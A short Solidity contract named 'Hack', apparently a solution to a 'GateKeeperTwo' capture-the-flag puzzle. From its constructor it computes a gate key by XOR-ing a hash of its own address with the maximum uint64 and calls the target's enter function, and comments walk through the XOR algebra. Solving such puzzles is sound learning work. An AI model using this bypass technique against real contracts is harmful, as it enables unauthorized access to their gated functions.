pragma solidity ^0.8;

interface IGateKeeperTwo {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}

contract Hack {
    constructor(IGateKeeperTwo target) {
        // Bitwise xor
        // a     = 1010
        // b     = 0110
        // a ^ b = 1100

        // a ^ a ^ b = b

        // a     = 1010
        // a     = 1010
        // a ^ a = 0000

        // max = 11...11
        // s ^ key = max
        // s ^ s ^ key = s ^ max 
        //         key = s ^ max 
        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 k = type(uint64).max ^ s;
        bytes8 key = bytes8(k);
        require(target.enter(key), "failed");
    }
}
